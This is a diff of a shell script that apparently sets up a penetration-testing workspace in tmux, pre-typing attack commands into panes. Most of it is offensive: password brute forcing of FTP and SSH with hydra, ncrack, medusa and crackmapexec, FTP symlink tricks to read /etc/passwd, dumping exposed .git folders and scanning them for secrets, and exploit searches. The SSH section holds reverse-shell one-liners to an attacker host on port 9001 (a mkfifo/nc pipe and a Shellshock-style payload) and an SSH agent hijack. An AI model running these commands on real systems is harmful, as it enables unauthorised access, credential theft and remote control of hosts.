@@ -1539,183 +1539,181 @@ tmux send-keys "site=$site" Enter
 tmux send-keys "domain=$domain" Enter
 tmux send-keys "cd $folderProjectInfoGathering" Enter
 
+# Service AuthN bypass
+cd $folderProjectAuthN
+# ALL PROTOCOL !!!
+tmux new-window -t PT:1 -n 'ALL PROTOCOLs activities'
+tmux split-window -v -t PT:1.0
+tmux select-pane -t "1.0"
+tmux split-window -h -t "1.0"
+tmux split-window -h -t "1.0"
+tmux split-window -v -t PT:1.3
+tmux select-pane -t "1.3"
+tmux split-window -h -t "1.3"
+tmux split-window -h -t "1.3"
+tmux split-window -h -t "1.3"
+tmux split-window -v -t PT:1.7
+tmux select-pane -t "1.7"
+tmux split-window -h -t "1.7"
+tmux split-window -h -t "1.7"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:1.0 "# Bruteforce find DICTIONARY with seclists" Enter
+tmux send-keys -t PT:1.0 "find /usr/share/seclists/ -follow | grep user | xargs wc -l | sort -n"
+tmux send-keys -t PT:1.1 "# Bruteforce find DICTIONARY with seclists" Enter
+tmux send-keys -t PT:1.1 "find /usr/share/seclists/ -follow | grep pass | xargs wc -l | sort -n"
+tmux send-keys -t PT:1.2 "# Create DICTIONARY with cewl" Enter
+tmux send-keys -t PT:1.2 "cewl $url -d 3 -m 5 -w cewl-subdomain.txt --with-numbers"
+tmux send-keys -t PT:1.3 "# Bruteforce with HYDRA" Enter
+tmux send-keys -t PT:1.3 "hydra -L users.txt -P passwords.txt [-t 32] $ip ftp"
+tmux send-keys -t PT:1.4 "# Bruteforce with NCRACK" Enter
+tmux send-keys -t PT:1.4 "ncrack -p 21 -U users.txt -P passwords.txt $ip [-T 5]"
+tmux send-keys -t PT:1.5 "# Bruteforce with MEDUSA" Enter
+tmux send-keys -t PT:1.5 "medusa -U users.txt -P passwords.txt -h $ip -M ftp"
+tmux send-keys -t PT:1.6 "# Bruteforce with CRACKMAPEXEC" Enter
+tmux send-keys -t PT:1.6 "crackmapexec ssh $ip -u users.txt -p pass.txt "
+tmux send-keys -t PT:1.7 "# Exploitation: update searchsploit" Enter
+tmux send-keys -t PT:1.7 "searchsploit -u"
+tmux send-keys -t PT:1.8 "# Exploitation: search" Enter
+tmux send-keys -t PT:1.8 "searchsploit \"<service to attack>\""
+tmux send-keys -t PT:1.9 "# Exploitation with msfconsole" Enter
+tmux send-keys -t PT:1.9 "msfconsole -qx \"search type:exploit <servizio da cercare>\""
+cd $folderProject
+
 
 # Service AuthN bypass
 cd $folderProjectAuthN
 # FTP
-tmux new-window -t PT:1 -n 'Service AuthN bypass: FTP'
-tmux split-window -v -t PT:1.0
-tmux split-window -v -t PT:1.1
-tmux select-pane -t "1.1"
-tmux split-window -h -t "1.1"
-tmux split-window -h -t "1.1"
-tmux split-window -h -t "1.1"
-tmux split-window -h -t "1.1"
-tmux split-window -v -t PT:1.6
-tmux select-pane -t "1.6"
-tmux split-window -h -t "1.6"
-tmux split-window -h -t "1.6"
-tmux split-window -h -t "1.6"
-tmux split-window -h -t "1.6"
-tmux split-window -v -t PT:1.11
-tmux select-pane -t "1.11"
-tmux split-window -h -t "1.11"
-tmux split-window -h -t "1.11"
+tmux new-window -t PT:2 -n 'Service AuthN bypass: FTP'
+tmux split-window -v -t PT:2.0
+tmux split-window -v -t PT:2.1
+tmux select-pane -t "2.1"
+tmux split-window -h -t "2.1"
+tmux split-window -h -t "2.1"
+tmux split-window -h -t "2.1"
+tmux split-window -h -t "2.1"
 # Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:1.0 "# FTP service fingerprint" Enter
-tmux send-keys -t PT:1.0 "nmap -sV -Pn -vv -p 21 --script=ftp* $ip -oA out.21"
-tmux send-keys -t PT:1.1 "# FTP Information Exposure: get all data PASSIVE mode" Enter
-tmux send-keys -t PT:1.1 "wget -m ftp://anonymous:anonymous@$ip"
-tmux send-keys -t PT:1.2 "# FTP Information Exposure: gat all data ACTIVe mode " Enter
-tmux send-keys -t PT:1.2 "wget -m –no-passive ftp://anonymous:anonymous@$ip"
-tmux send-keys -t PT:1.3 "# FTP Information Exposure: get all data specifying user and pass" Enter
-tmux send-keys -t PT:1.3 "wget -r --user=\"user\" --password=\"Pass\" ftp://$ip"
-tmux send-keys -t PT:1.4 "# FTP Information Exposure; Symlink attack with site exec" Enter
-tmux send-keys -t PT:1.4 "(echo \"user anonymous anonymous\"; echo \"help\"; echo \"site exec ln -s /etc/passwd passwd_ln\"; echo \"site exec passwd_ln\"; echo \"bye\") | ftp -n $ip"
-tmux send-keys -t PT:1.5 "# FTP Information Exposure; Symlink attack with site symlink " Enter
-tmux send-keys -t PT:1.5 "(echo \"user anonymous anonymous\"; echo \"help\"; echo \"site symlink /etc/passwd passwd_ln\"; echo \"site exec passwd_ln\"; echo \"bye\") | ftp -n $ip"
-tmux send-keys -t PT:1.6 "# FTP authN bypass: bruteforce find DICTIONARY" Enter
-tmux send-keys -t PT:1.6 "find /usr/share/seclists/ -follow | grep user | xargs wc -l | sort -n"
-tmux send-keys -t PT:1.7 "# FTP authN bypass: bruteforce find DICTIONARY" Enter
-tmux send-keys -t PT:1.7 "find /usr/share/seclists/ -follow | grep pass | xargs wc -l | sort -n"
-tmux send-keys -t PT:1.8 "# FTP authN bypass: bruteforce with HYDRA" Enter
-tmux send-keys -t PT:1.8 "hydra -L users.txt -P passwords.txt [-t 32] $ip ftp"
-tmux send-keys -t PT:1.9 "# FTP authN bypass: bruteforce with NCRACK" Enter
-tmux send-keys -t PT:1.9 "ncrack -p 21 -U users.txt -P passwords.txt $ip [-T 5]"
-tmux send-keys -t PT:1.10 "# FTP authN bypass: bruteforce with MEDUSA" Enter
-tmux send-keys -t PT:1.10 "medusa -U users.txt -P passwords.txt -h $ip -M ftp"
-tmux send-keys -t PT:1.11 "# FTP authN bypass: exploitation" Enter
-tmux send-keys -t PT:1.11 "searchsploit -u"
-tmux send-keys -t PT:1.12 "# FTP authn bypass: exploitation" Enter
-tmux send-keys -t PT:1.12 "searchsploit \"<servizio da cercare>\""
-tmux send-keys -t PT:1.13 "# FTP authn bypass: exploitation" Enter
-tmux send-keys -t PT:1.13 "msfconsole -qx \"search type:exploit <servizio da cercare>\""
+tmux send-keys -t PT:2.0 "# FTP service fingerprint" Enter
+tmux send-keys -t PT:2.0 "nmap -sV -Pn -vv -p 21 --script=ftp* $ip -oA out.21"
+tmux send-keys -t PT:2.1 "# FTP Information Exposure: get all data PASSIVE mode" Enter
+tmux send-keys -t PT:2.1 "wget -m ftp://anonymous:anonymous@$ip"
+tmux send-keys -t PT:2.2 "# FTP Information Exposure: gat all data ACTIVe mode " Enter
+tmux send-keys -t PT:2.2 "wget -m –no-passive ftp://anonymous:anonymous@$ip"
+tmux send-keys -t PT:2.3 "# FTP Information Exposure: get all data specifying user and pass" Enter
+tmux send-keys -t PT:2.3 "wget -r --user=\"user\" --password=\"Pass\" ftp://$ip"
+tmux send-keys -t PT:2.4 "# FTP Information Exposure; Symlink attack with site exec" Enter
+tmux send-keys -t PT:2.4 "(echo \"user anonymous anonymous\"; echo \"help\"; echo \"site exec ln -s /etc/passwd passwd_ln\"; echo \"site exec passwd_ln\"; echo \"bye\") | ftp -n $ip"
+tmux send-keys -t PT:2.5 "# FTP Information Exposure; Symlink attack with site symlink " Enter
+tmux send-keys -t PT:2.5 "(echo \"user anonymous anonymous\"; echo \"help\"; echo \"site symlink /etc/passwd passwd_ln\"; echo \"site exec passwd_ln\"; echo \"bye\") | ftp -n $ip"
 cd $folderProject
 
 cd $folderProjectAuthN
 # GIT
-tmux new-window -t PT:2 -n 'Service AuthN bypass: GIT'
-tmux split-window -v -t PT:2.0
-tmux select-pane -t "2.0"
-tmux split-window -h -t "2.0"
-tmux split-window -h -t "2.0"
-tmux split-window -h -t "2.0"
-tmux split-window -h -t "2.0"
-tmux split-window -h -t "2.0"
-tmux split-window -v -t PT:2.6
-tmux select-pane -t "2.6"
-tmux split-window -h -t "2.6"
-tmux split-window -h -t "2.6"
-tmux split-window -v -t PT:2.9
-tmux select-pane -t "2.9"
-tmux split-window -h -t "2.9"
-tmux split-window -h -t "2.9"
+tmux new-window -t PT:3 -n 'Service AuthN bypass: GIT'
+tmux split-window -v -t PT:3.0
+tmux select-pane -t "3.0"
+tmux split-window -h -t "3.0"
+tmux split-window -h -t "3.0"
+tmux split-window -h -t "3.0"
+tmux split-window -h -t "3.0"
+tmux split-window -h -t "3.0"
+tmux split-window -v -t PT:3.6
+tmux select-pane -t "3.6"
+tmux split-window -h -t "3.6"
+tmux split-window -h -t "3.6"
+tmux split-window -v -t PT:3.9
+tmux select-pane -t "3.9"
+tmux split-window -h -t "3.9"
+tmux split-window -h -t "3.9"
 # Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:2.0 "# GIT download LOCAL repository" Enter
-tmux send-keys -t PT:2.0 "git clone /opt/git/project.git"
-tmux send-keys -t PT:2.1 "# GIT download LOCAL repository" Enter
-tmux send-keys -t PT:2.1 "git clone file:///opt/git/project.git"
-tmux send-keys -t PT:2.2 "# GIT download REMOTE repository" Enter
-tmux send-keys -t PT:2.2 "git clone $url/project.git"
-tmux send-keys -t PT:2.3 "# GIT download REMOTE repository" Enter
-tmux send-keys -t PT:2.3 "git clone ssh://user@$domain/project.git"
-tmux send-keys -t PT:2.4 "# GIT download .git file" Enter
-tmux send-keys -t PT:2.4 "source git_stuff/bin/activate && git-dumper $url/.git/ ./"
-tmux send-keys -t PT:2.5 "# GIT download .git file" Enter
-tmux send-keys -t PT:2.5 "wget --recursive --no-clobber --page-requisites --convert-links --domains targetDomain.ctf --no-parent $url/.git/"
-tmux send-keys -t PT:2.6 "# GIT repository analysis (user, pass, token) with gitleaks" Enter
-tmux send-keys -t PT:2.6 "sudo gitleaks detect --source=/path/to/.git --verbose"
-tmux send-keys -t PT:2.7 "# GIT repository analysis (user, pass, token) with trufflwhog" Enter
-tmux send-keys -t PT:2.7 "trufflehog git /path/to/.git"
-tmux send-keys -t PT:2.8 "# GIT repository analysis (user, pass, token) with grep" Enter
-tmux send-keys -t PT:2.8 "grep -r \"password\|secret\|token\|key\" /home/kali/Desktop/appo/SiteSniper/"
-tmux send-keys -t PT:2.9 "# GIT: navigate the repository versioning" Enter
-tmux send-keys -t PT:2.9 "git log -p"
-tmux send-keys -t PT:2.10 "# GIT: navigate the repository versioning" Enter
-tmux send-keys -t PT:2.10 "git diff <UUID commit>"
-tmux send-keys -t PT:2.11 "# GIT: navigate the repository versioning" Enter
-tmux send-keys -t PT:2.11 "git reset --hard <UUID commit>"
+tmux send-keys -t PT:3.0 "# GIT download LOCAL repository" Enter
+tmux send-keys -t PT:3.0 "git clone /opt/git/project.git"
+tmux send-keys -t PT:3.1 "# GIT download LOCAL repository" Enter
+tmux send-keys -t PT:3.1 "git clone file:///opt/git/project.git"
+tmux send-keys -t PT:3.2 "# GIT download REMOTE repository" Enter
+tmux send-keys -t PT:3.2 "git clone $url/project.git"
+tmux send-keys -t PT:3.3 "# GIT download REMOTE repository" Enter
+tmux send-keys -t PT:3.3 "git clone ssh://user@$domain/project.git"
+tmux send-keys -t PT:3.4 "# GIT download .git file" Enter
+tmux send-keys -t PT:3.4 "source git_stuff/bin/activate && git-dumper $url/.git/ ./"
+tmux send-keys -t PT:3.5 "# GIT download .git file" Enter
+tmux send-keys -t PT:3.5 "wget --recursive --no-clobber --page-requisites --convert-links --domains targetDomain.ctf --no-parent $url/.git/"
+tmux send-keys -t PT:3.6 "# GIT repository analysis (user, pass, token) with gitleaks" Enter
+tmux send-keys -t PT:3.6 "sudo gitleaks detect --source=/path/to/.git --verbose"
+tmux send-keys -t PT:3.7 "# GIT repository analysis (user, pass, token) with trufflwhog" Enter
+tmux send-keys -t PT:3.7 "trufflehog git /path/to/.git"
+tmux send-keys -t PT:3.8 "# GIT repository analysis (user, pass, token) with grep" Enter
+tmux send-keys -t PT:3.8 "grep -r \"password\|secret\|token\|key\" /home/kali/Desktop/appo/SiteSniper/"
+tmux send-keys -t PT:3.9 "# GIT: navigate the repository versioning" Enter
+tmux send-keys -t PT:3.9 "git log -p"
+tmux send-keys -t PT:3.10 "# GIT: navigate the repository versioning" Enter
+tmux send-keys -t PT:3.10 "git diff <UUID commit>"
+tmux send-keys -t PT:3.11 "# GIT: navigate the repository versioning" Enter
+tmux send-keys -t PT:3.11 "git reset --hard <UUID commit>"
 cd $folderProject
 
 cd $folderProjectAuthN
 # SSH
-tmux new-window -t PT:3 -n 'Service AuthN bypass: SSH'
-tmux split-window -v -t PT:3.0
-tmux split-window -v -t PT:3.1
-tmux select-pane -t "3.1"
-tmux split-window -h -t "3.1"
-tmux split-window -h -t "3.1"
-tmux split-window -h -t "3.1"
-tmux split-window -h -t "3.1"
-tmux split-window -v -t PT:3.6
-tmux select-pane -t "3.6"
-tmux split-window -h -t "3.6"
-tmux split-window -v -t PT:3.7
+tmux new-window -t PT:4 -n 'Service AuthN bypass: SSH'
+tmux split-window -v -t PT:4.0
+tmux split-window -v -t PT:4.1
+tmux select-pane -t "4.1"
+tmux split-window -h -t "4.1"
+tmux split-window -v -t PT:4.3
 # Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:3.0 "# SSH Service fingerprint" Enter
-tmux send-keys -t PT:3.0 "nmap -sV -Pn -vv -p 22 --script=ftp* $ip -oA out.22"
-tmux send-keys -t PT:3.1 "# SSH bruteforce attack" Enter
-tmux send-keys -t PT:3.1 "find /usr/share/seclists/ -follow | grep pass | xargs wc -l | sort -n"
-tmux send-keys -t PT:3.2 "# SSH bruteforce attack" Enter
-tmux send-keys -t PT:3.2 "hydra -L users.txt -P password.txt ssh://$ip"
-tmux send-keys -t PT:3.3 "# SSH bruteforce attack" Enter
-tmux send-keys -t PT:3.3 "crackmapexec ssh $ip -u users.txt -p pass.txt "
-tmux send-keys -t PT:3.4 "# SSH bruteforce attack" Enter
-tmux send-keys -t PT:3.4 "ncrack -p 22 -U users.txt -P passwords.txt $ip [-T 5]"
-tmux send-keys -t PT:3.5 "# SSH bruteforce attack" Enter
-tmux send-keys -t PT:3.5 "medusa -U users.txt -P passwords.txt -h $ip -M ssh"
-tmux send-keys -t PT:3.6 "# SSH blocked bypass calling attackerIP:9001" Enter
-tmux send-keys -t PT:3.6 "ssh <USER>@$ip 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $attackerIP 9001 >/tmp/f'"
-tmux send-keys -t PT:3.7 "# SSH blocked bypass calling attackerIP:9001" Enter
-tmux send-keys -t PT:3.7 "ssh <USER>@$ip '() { :;}; /bin/nc -nv $attackerIP 9001 -e /bin/bash'"
-tmux send-keys -t PT:3.8 "# SSH Hijacking" Enter
-tmux send-keys -t PT:3.8 "SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXXX ssh root@<TARGET_IP> -p <TARGET_PORT>"
+tmux send-keys -t PT:4.0 "# SSH Service fingerprint" Enter
+tmux send-keys -t PT:4.0 "nmap -sV -Pn -vv -p 22 --script=ftp* $ip -oA out.22"
+tmux send-keys -t PT:4.1 "# SSH blocked bypass calling attackerIP:9001" Enter
+tmux send-keys -t PT:4.1 "ssh <USER>@$ip 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $attackerIP 9001 >/tmp/f'"
+tmux send-keys -t PT:4.2 "# SSH blocked bypass calling attackerIP:9001" Enter
+tmux send-keys -t PT:4.2 "ssh <USER>@$ip '() { :;}; /bin/nc -nv $attackerIP 9001 -e /bin/bash'"
+tmux send-keys -t PT:4.3 "# SSH Hijacking" Enter
+tmux send-keys -t PT:4.3 "SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXXX ssh root@<TARGET_IP> -p <TARGET_PORT>"
 cd $folderProject
 
 cd $folderProjectAuthN
 # SVN
-tmux new-window -t PT:4 -n 'Service AuthN bypass: SVN'
-tmux split-window -v -t PT:4.0
-tmux select-pane -t "4.0"
-tmux split-window -h -t "4.0"
-tmux split-window -h -t "4.0"
-tmux split-window -v -t PT:4.3
-tmux select-pane -t "4.3"
-tmux split-window -h -t "4.3"
-tmux split-window -h -t "4.3"
-tmux split-window -v -t PT:4.6
-tmux select-pane -t "4.6"
-tmux split-window -h -t "4.6"
-tmux split-window -h -t "4.6"
-tmux split-window -v -t PT:4.9
-tmux select-pane -t "4.9"
-tmux split-window -h -t "4.9"
-tmux split-window -h -t "4.9"
+tmux new-window -t PT:5 -n 'Service AuthN bypass: SVN'
+tmux split-window -v -t PT:5.0
+tmux select-pane -t "5.0"
+tmux split-window -h -t "5.0"
+tmux split-window -h -t "5.0"
+tmux split-window -v -t PT:5.3
+tmux select-pane -t "5.3"
+tmux split-window -h -t "5.3"
+tmux split-window -h -t "5.3"
+tmux split-window -v -t PT:5.6
+tmux select-pane -t "5.6"
+tmux split-window -h -t "5.6"
+tmux split-window -h -t "5.6"
+tmux split-window -v -t PT:5.9
+tmux select-pane -t "5.9"
+tmux split-window -h -t "5.9"
+tmux split-window -h -t "5.9"
 # Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:4.0 "# SVN: download SVN repository" Enter
-tmux send-keys -t PT:4.0 "svn checkout $url/url-del-repo-svn /path/to/local/folder"
-tmux send-keys -t PT:4.1 "# SVN: download SVN repository" Enter
-tmux send-keys -t PT:4.1 "svn checkout file:///$site/percorso/del/repo/svn /path/to/local/folder"
-tmux send-keys -t PT:4.2 "# SVN: analyze SVN repo with grep" Enter
-tmux send-keys -t PT:4.2 "grep -r \"password\|token\|api_key\" /path/to/local/folder"
-tmux send-keys -t PT:4.3 "# SVN: download SVN repository as GIT one" Enter
-tmux send-keys -t PT:4.3 "git svn clone $url/url-del-repo-svn"
-tmux send-keys -t PT:4.4 "# SVN: download SVN repository as GIT one" Enter
-tmux send-keys -t PT:4.4 "git svn clone --stdlayout --prefix=svn/ --no-metadata $url/url-del-repo-svn"
-tmux send-keys -t PT:4.5 "# SVN: download SVN repository as GIT one" Enter
-tmux send-keys -t PT:4.5 "git svn clone --trunk=nome_trunk --branches=nome_branches --tags=nome_tags https://url-del-repo-svn"
-tmux send-keys -t PT:4.6 "# SVN repository (downloaded as GIT repo) analysis (user, pass, token) with gitleaks" Enter
-tmux send-keys -t PT:4.6 "sudo gitleaks detect --source=/path/to/.git --verbose"
-tmux send-keys -t PT:4.7 "# SVN repository (downloaded as GIT repo) analysis (user, pass, token) with trufflwhog" Enter
-tmux send-keys -t PT:4.7 "trufflehog git /path/to/.git"
-tmux send-keys -t PT:4.8 "# SVN repository (downloaded as GIT repo) analysis (user, pass, token) with grep" Enter
-tmux send-keys -t PT:4.8 "grep -r \"password\|secret\|token\|key\" /home/kali/Desktop/appo/SiteSniper/"
-tmux send-keys -t PT:4.9 "# SVN: navigate the SVN repository (downloaded as GIT repo) versioning" Enter
-tmux send-keys -t PT:4.9 "git log -p"
-tmux send-keys -t PT:4.10 "# SVN: navigate the SVN repository (downloaded as GIT repo) versioning" Enter
-tmux send-keys -t PT:4.10 "git diff <UUID commit>"
-tmux send-keys -t PT:4.11 "# SVN: navigate the SVN repository (downloaded as GIT repo) versioning" Enter
-tmux send-keys -t PT:4.11 "git reset --hard <UUID commit>"
+tmux send-keys -t PT:5.0 "# SVN: download SVN repository" Enter
+tmux send-keys -t PT:5.0 "svn checkout $url/url-del-repo-svn /path/to/local/folder"
+tmux send-keys -t PT:5.1 "# SVN: download SVN repository" Enter
+tmux send-keys -t PT:5.1 "svn checkout file:///$site/percorso/del/repo/svn /path/to/local/folder"
+tmux send-keys -t PT:5.2 "# SVN: analyze SVN repo with grep" Enter
+tmux send-keys -t PT:5.2 "grep -r \"password\|token\|api_key\" /path/to/local/folder"
+tmux send-keys -t PT:5.3 "# SVN: download SVN repository as GIT one" Enter
+tmux send-keys -t PT:5.3 "git svn clone $url/url-del-repo-svn"
+tmux send-keys -t PT:5.4 "# SVN: download SVN repository as GIT one" Enter
+tmux send-keys -t PT:5.4 "git svn clone --stdlayout --prefix=svn/ --no-metadata $url/url-del-repo-svn"
+tmux send-keys -t PT:5.5 "# SVN: download SVN repository as GIT one" Enter
+tmux send-keys -t PT:5.5 "git svn clone --trunk=nome_trunk --branches=nome_branches --tags=nome_tags https://url-del-repo-svn"
+tmux send-keys -t PT:5.6 "# SVN repository (downloaded as GIT repo) analysis (user, pass, token) with gitleaks" Enter
+tmux send-keys -t PT:5.6 "sudo gitleaks detect --source=/path/to/.git --verbose"
+tmux send-keys -t PT:5.7 "# SVN repository (downloaded as GIT repo) analysis (user, pass, token) with trufflwhog" Enter
+tmux send-keys -t PT:5.7 "trufflehog git /path/to/.git"
+tmux send-keys -t PT:5.8 "# SVN repository (downloaded as GIT repo) analysis (user, pass, token) with grep" Enter
+tmux send-keys -t PT:5.8 "grep -r \"password\|secret\|token\|key\" /home/kali/Desktop/appo/SiteSniper/"
+tmux send-keys -t PT:5.9 "# SVN: navigate the SVN repository (downloaded as GIT repo) versioning" Enter
+tmux send-keys -t PT:5.9 "git log -p"
+tmux send-keys -t PT:5.10 "# SVN: navigate the SVN repository (downloaded as GIT repo) versioning" Enter
+tmux send-keys -t PT:5.10 "git diff <UUID commit>"
+tmux send-keys -t PT:5.11 "# SVN: navigate the SVN repository (downloaded as GIT repo) versioning" Enter
+tmux send-keys -t PT:5.11 "git reset --hard <UUID commit>"
 cd $folderProject
 
 
